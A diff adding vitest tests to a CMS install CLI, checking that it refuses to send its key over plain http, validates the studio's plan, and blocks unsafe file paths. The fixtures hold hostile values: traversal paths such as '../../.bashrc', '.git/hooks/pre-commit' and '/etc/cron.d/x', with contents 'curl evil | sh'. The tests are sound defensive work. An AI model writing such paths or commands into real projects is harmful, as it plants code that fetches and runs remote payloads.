@@ -4,9 +4,11 @@ import { join, resolve } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import { parseArgs, normalizeBlogPath } from "../args";
 import { detectProject, rebasePath } from "../detect";
-import { fallbackPlan, fetchPlan, studioOriginFromApiUrl } from "../plan";
+import { UnsafePlanError, applyPlan } from "../apply";
+import { fallbackPlan, fetchPlan, studioOriginFromApiUrl, validateInstallPlan } from "../plan";
 import { run, type Io } from "../run";
-import type { InstallPlan } from "../snippets";
+import { assertSafeRelativePath, resolveInside } from "../safe-path";
+import type { InstallPlan, PlanFile } from "../snippets";
 
 /**
  * The command that writes into someone else's repository.
@@ -59,6 +61,25 @@ function io(env: Record<string, string | undefined> = {}, fetchImpl?: typeof fet
     cwd: () => process.cwd(),
     env,
     ...(fetchImpl ? { fetchImpl } : {}),
+  };
+}
+
+/** One entry of a plan's `files`, shaped the way the studio really sends it. */
+function planFile(path: string, contents = "export {};\n"): PlanFile {
+  return { path, contents, purpose: "a test file", overwrite: false };
+}
+
+/** The built-in plan with its `files` replaced — everything else stays valid. */
+function planWith(files: PlanFile[]): InstallPlan {
+  return {
+    ...fallbackPlan({
+      studioOrigin: "https://studio.spendtab.com",
+      apiUrl: null,
+      siteUrl: "https://spendtab.com",
+      blogPath: "/blog",
+      packageManager: "pnpm",
+    }).plan,
+    files,
   };
 }
 
@@ -240,7 +261,7 @@ describe("fetching this site's plan", () => {
     const seen: { url: string; headers: Record<string, string> }[] = [];
     const stub = (async (url: string, init: RequestInit) => {
       seen.push({ url, headers: init.headers as Record<string, string> });
-      return new Response(JSON.stringify({ files: [{ path: "lib/cms.ts" }] }), { status: 200 });
+      return new Response(JSON.stringify({ files: [planFile("lib/cms.ts")] }), { status: 200 });
     }) as unknown as typeof fetch;
 
     await fetchPlan({
@@ -266,6 +287,238 @@ describe("fetching this site's plan", () => {
         fetchImpl: stub,
       }),
     ).rejects.toThrow(/401/);
+  });
+
+  /**
+   * The key is a bearer token on the request, and a studio URL is whatever the
+   * caller typed. Over http the token is readable by every hop, so the request
+   * must never leave — not "leave and then warn".
+   */
+  it("refuses to send the key over plain http, before any request is made", async () => {
+    let calls = 0;
+    const stub = (async () => {
+      calls += 1;
+      return new Response("{}", { status: 200 });
+    }) as unknown as typeof fetch;
+
+    await expect(
+      fetchPlan({
+        studioOrigin: "http://studio.spendtab.com",
+        key: "cms_sk_live",
+        packageManager: "pnpm",
+        fetchImpl: stub,
+      }),
+    ).rejects.toThrow(TypeError);
+    await expect(
+      fetchPlan({
+        studioOrigin: "http://studio.spendtab.com",
+        key: "cms_sk_live",
+        packageManager: "pnpm",
+        fetchImpl: stub,
+      }),
+    ).rejects.toThrow(/https:\/\//);
+    expect(calls).toBe(0);
+  });
+
+  it("allows plain http to localhost, where there is no network to cross", async () => {
+    const seen: string[] = [];
+    const stub = (async (url: string) => {
+      seen.push(url);
+      return new Response(JSON.stringify({ files: [planFile("lib/cms.ts")] }), { status: 200 });
+    }) as unknown as typeof fetch;
+
+    await fetchPlan({
+      studioOrigin: "http://localhost:3000",
+      key: "cms_sk_dev",
+      packageManager: "pnpm",
+      fetchImpl: stub,
+    });
+
+    expect(seen[0]).toContain("http://localhost:3000/api/v1/site/install-plan");
+  });
+
+  it("stops the run, and writes nothing, when --studio-url is http", async () => {
+    const root = nextProject();
+    const before = walk(root);
+    const context = io({}, (async () => new Response("{}")) as unknown as typeof fetch);
+
+    const code = await run(
+      ["init", "--dir", root, "--studio-url", "http://studio.spendtab.com", "--key", "cms_sk_x"],
+      context,
+    );
+
+    expect(code).toBe(1);
+    expect(context.err.join("\n")).toContain("nothing was written");
+    expect(context.err.join("\n")).toContain("https://");
+    expect(walk(root)).toEqual(before);
+  });
+});
+
+describe("validating what the studio sent", () => {
+  const ORIGIN = "https://studio.spendtab.com";
+
+  it("accepts the shape the studio really sends", () => {
+    const plan = planWith([planFile("lib/cms.ts"), planFile("app/blog/[slug]/page.tsx")]);
+    expect(validateInstallPlan(JSON.parse(JSON.stringify(plan)), ORIGIN).files).toHaveLength(2);
+  });
+
+  it("rejects a body whose files is not an array, naming the studio", () => {
+    expect(() => validateInstallPlan({ files: "lib/cms.ts" }, ORIGIN)).toThrow(/studio\.spendtab\.com/);
+    expect(() => validateInstallPlan({ files: { path: "lib/cms.ts" } }, ORIGIN)).toThrow(/not an array/);
+    expect(() => validateInstallPlan([], ORIGIN)).toThrow(/not a JSON object/);
+    expect(() => validateInstallPlan(null, ORIGIN)).toThrow(/not a JSON object/);
+  });
+
+  it("rejects a plan with no files, or an entry that is not a file", () => {
+    expect(() => validateInstallPlan({ files: [] }, ORIGIN)).toThrow(/no files/);
+    expect(() => validateInstallPlan({ files: ["lib/cms.ts"] }, ORIGIN)).toThrow(/files\[0\] is not an object/);
+    expect(() => validateInstallPlan({ files: [{ path: "lib/cms.ts" }] }, ORIGIN)).toThrow(/contents/);
+    expect(() =>
+      validateInstallPlan({ files: [{ path: "lib/cms.ts", contents: "", purpose: 7 }] }, ORIGIN),
+    ).toThrow(/purpose/);
+  });
+
+  it("rejects an oversized plan: too many files, or a file too large", () => {
+    const many = Array.from({ length: 51 }, (_, i) => planFile(`lib/file-${i}.ts`));
+    expect(() => validateInstallPlan({ files: many }, ORIGIN)).toThrow(/51 files; the limit is 50/);
+
+    const huge = [planFile("lib/cms.ts", "x".repeat(262_145))];
+    expect(() => validateInstallPlan({ files: huge }, ORIGIN)).toThrow(/contents is longer than/);
+
+    const long = [planFile(`lib/${"a".repeat(512)}.ts`)];
+    expect(() => validateInstallPlan({ files: long }, ORIGIN)).toThrow(/path is longer than/);
+  });
+
+  it("rejects a hostile path at the door, naming the studio and the path", () => {
+    for (const path of ["../x", "/etc/x", ".git/hooks/pre-commit", "lib\\..\\x", "lib/cms.ts\u0000"]) {
+      expect(() => validateInstallPlan({ files: [planFile(path)] }, ORIGIN)).toThrow(
+        /studio\.spendtab\.com.*path is unsafe/,
+      );
+    }
+  });
+});
+
+describe("refusing to write outside the project", () => {
+  it("rejects every way of naming a path that is not inside the project", () => {
+    const bad: [string, RegExp][] = [
+      ["../x", /`\.` and `\.\.` segments/],
+      ["lib/../../x", /`\.` and `\.\.` segments/],
+      ["./lib/cms.ts", /`\.` and `\.\.` segments/],
+      ["/etc/x", /absolute/],
+      ["//server/share/x", /absolute/],
+      ["C:/Windows/x", /drive-letter/],
+      ["C:\\Windows\\x", /backslash/],
+      ["lib\\..\\x", /backslash/],
+      ["\\\\server\\share", /backslash/],
+      ["lib/cms.ts\u0000.txt", /control character/],
+      ["lib/\ncms.ts", /control character/],
+      [".git/hooks/pre-commit", /`\.git`/],
+      [".GIT/hooks/pre-commit", /`\.GIT`/],
+      ["packages/x/.git/config", /`\.git`/],
+      ["node_modules/next/index.js", /`node_modules`/],
+      [".env", /environment files/],
+      [".env.local", /environment files/],
+      ["app/.env.production", /environment files/],
+      ["", /empty/],
+      ["lib//cms.ts", /empty segment/],
+      ["lib/cms.ts/", /empty segment/],
+    ];
+    for (const [path, why] of bad) {
+      expect(() => assertSafeRelativePath(path), path).toThrow(why);
+      expect(() => resolveInside("/srv/app", path), path).toThrow(why);
+    }
+  });
+
+  it("accepts the paths a real plan contains", () => {
+    for (const path of [
+      "lib/cms.ts",
+      "app/blog/[slug]/page.tsx",
+      "app/api/cms/revalidate/route.ts",
+      "next.config.mjs",
+      "src/app/rss.xml/route.ts",
+      "app/.well-known/thing.txt",
+    ]) {
+      expect(() => assertSafeRelativePath(path), path).not.toThrow();
+    }
+  });
+
+  it("resolves inside the root and refuses a sibling that merely shares its prefix", () => {
+    expect(resolveInside("/srv/app", "lib/cms.ts")).toBe(resolve("/srv/app", "lib/cms.ts"));
+    // The check is against `root + sep`, so `/srv/app-evil` is outside `/srv/app`.
+    expect(resolveInside("/srv/app", "lib/cms.ts").startsWith(resolve("/srv/app") + "/")).toBe(true);
+  });
+
+  /**
+   * The property the whole guard exists for. A plan with eight good files and
+   * one `../../.bashrc` is not "eight files and a warning": it is evidence of
+   * a hostile server, and the eight are not to be trusted either.
+   */
+  it("writes NOTHING when a single path in the plan is bad", () => {
+    const root = nextProject();
+    const before = walk(root);
+    const plan = planWith([
+      planFile("lib/cms.ts"),
+      planFile("app/blog/[slug]/page.tsx"),
+      planFile("../../.bashrc", "curl evil | sh"),
+      planFile("app/sitemap.xml/route.ts"),
+    ]);
+
+    expect(() => applyPlan(plan, { root, srcDir: "", dryRun: false })).toThrow(UnsafePlanError);
+    expect(walk(root)).toEqual(before);
+    expect(existsSync(join(root, "lib/cms.ts"))).toBe(false);
+    expect(existsSync(resolve(root, "../../.bashrc"))).toBe(false);
+  });
+
+  it("reports the rejected path as a skip, with the reason, alongside the rest", () => {
+    const root = nextProject();
+    const plan = planWith([
+      planFile("lib/cms.ts"),
+      planFile(".git/hooks/pre-commit", "#!/bin/sh\ncurl evil | sh"),
+      planFile("/etc/cron.d/x"),
+    ]);
+
+    let thrown: unknown;
+    try {
+      applyPlan(plan, { root, srcDir: "", dryRun: false });
+    } catch (error) {
+      thrown = error;
+    }
+    expect(thrown).toBeInstanceOf(UnsafePlanError);
+    const outcomes = (thrown as UnsafePlanError).outcomes;
+    expect(outcomes.map((o) => [o.path, o.action])).toEqual([
+      ["lib/cms.ts", "create"],
+      [".git/hooks/pre-commit", "skip"],
+      ["/etc/cron.d/x", "skip"],
+    ]);
+    expect(outcomes[1]!.reason).toMatch(/`\.git`/);
+    expect(outcomes[2]!.reason).toMatch(/absolute/);
+    expect(existsSync(join(root, ".git/hooks/pre-commit"))).toBe(false);
+  });
+
+  it("checks the path even under src/ rebasing and even on a dry run", () => {
+    const root = nextProject();
+    const plan = planWith([planFile("lib/../../escape.ts")]);
+    expect(() => applyPlan(plan, { root, srcDir: "src", dryRun: true })).toThrow(UnsafePlanError);
+    expect(existsSync(resolve(root, "../escape.ts"))).toBe(false);
+  });
+
+  it("through the CLI: a studio that sends one bad path gets exit 1 and an empty project", async () => {
+    const root = nextProject();
+    const before = walk(root);
+    const plan = planWith([planFile("lib/cms.ts"), planFile("../../.bashrc", "curl evil | sh")]);
+    const stub = (async () =>
+      new Response(JSON.stringify(plan), { status: 200 })) as unknown as typeof fetch;
+    const context = io({}, stub);
+
+    const code = await run(
+      ["init", "--dir", root, "--studio-url", "https://studio.spendtab.com", "--key", "cms_sk_x"],
+      context,
+    );
+
+    expect(code).toBe(1);
+    expect(context.err.join("\n")).toContain("nothing was written");
+    expect(context.err.join("\n")).toContain("../../.bashrc");
+    expect(walk(root)).toEqual(before);
   });
 });
 
